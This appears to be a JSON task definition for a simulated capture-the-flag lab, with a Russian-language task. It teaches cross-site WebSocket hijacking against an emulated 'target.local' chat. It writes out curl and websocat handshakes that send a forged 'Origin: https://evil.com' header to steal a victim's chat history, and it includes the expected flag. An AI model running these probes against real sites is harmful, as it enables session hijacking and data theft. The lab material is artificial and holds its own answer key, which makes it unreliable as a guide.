@@ -1,0 +1,59 @@
+{
+  "id": "web-websocket-smuggling",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{cswsh_101_w1th_f0r31gn_0r1g1n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: WebSocket smuggling / CSWSH\n\nЦель `target.local/chat` — чат на WebSocket; рукопожатие аутентифицируется cookie.\n\n1. Посмотри страницу чата: `curl -s https://target.local/chat`.\n2. Отправь рукопожатие с чужим `Origin: https://evil.com`.\n3. Если приходит `101 Switching Protocols` — проверки Origin нет: страница атакующего\n   откроет соединение от имени жертвы и получит её историю чата.\n4. Сохрани ответ с угнанной историей — там флаг.\n\nФлаг: `nto{...}` внутри угнанных данных.\n",
+      "mode": "644"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция target.local)",
+      "cases": [
+        {
+          "match": "evil\\.com",
+          "example": "-s -i -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Origin: https://evil.com' https://target.local/chat",
+          "output": "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\n\r\n[frame] {\"cmd\":\"history\",\"data\":\"[#42 admin] key rotation: nto{cswsh_101_w1th_f0r31gn_0r1g1n}\"}\r\n"
+        },
+        {
+          "match": "websocket",
+          "example": "-s -i -H 'Connection: Upgrade' -H 'Upgrade: websocket' https://target.local/chat",
+          "output": "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\n"
+        },
+        {
+          "match": "/chat",
+          "example": "-s https://target.local/chat",
+          "output": "<!doctype html><title>chat</title><script>const ws=new WebSocket(\"wss://target.local/chat\");</script>\n"
+        },
+        {
+          "match": "target\\.local",
+          "example": "-s https://target.local/",
+          "output": "<!doctype html><title>target.local</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется target.local.\n"
+    },
+    "websocat": {
+      "help": "websocat [опции] <url> — WS-клиент (эмуляция target.local/chat)",
+      "cases": [
+        {
+          "match": "evil\\.example",
+          "example": "-H='Origin: https://evil.example' wss://target.local/chat",
+          "output": "[connected] server accepted foreign Origin\n[frame] {\"cmd\":\"admin\"} -> {\"ok\":true}\n"
+        }
+      ],
+      "fallback": "websocat: в этой лабе эмулируется target.local/chat.\n"
+    }
+  }
+}
